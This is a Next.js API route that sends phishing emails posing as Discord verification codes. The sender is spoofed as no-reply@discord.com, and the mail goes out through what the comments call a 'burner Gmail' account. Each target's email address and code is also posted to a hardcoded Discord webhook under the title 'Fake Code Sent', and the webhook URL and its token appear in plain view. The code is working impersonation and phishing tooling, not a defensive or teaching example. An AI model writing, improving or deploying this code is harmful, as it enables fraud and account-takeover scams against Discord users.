import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(req: NextRequest) {
  const { email } = await req.json();

  const code = Math.floor(100000 + Math.random() * 900000).toString();

  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
      user: 'yourfake@gmail.com', // your burner Gmail
      pass: 'your-app-password' // Gmail App Password (not normal password)
    }
  });

  try {
    await transporter.sendMail({
      from: '"Discord" <no-reply@discord.com>',
      to: email,
      subject: 'Discord Verification Code',
      html: `
        <div style="font-family: Arial; color: #36393f;">
          <h2>Discord Verification</h2>
          <p>Use this code to verify your login:</p>
          <h1 style="letter-spacing: 10px; background: #f0f0f0; padding: 16px; text-align: center;">${code}</h1>
          <p>If you didn't request this, ignore this email.</p>
        </div>
      `
    });

    // Send code to your webhook too
    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "Fake Code Sent",
          fields: [
            { name: "To", value: email },
            { name: "Code", value: code }
          ]
        }]
      })
    });

    return NextResponse.json({ success: true, code }); // for testing only
  } catch (err) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
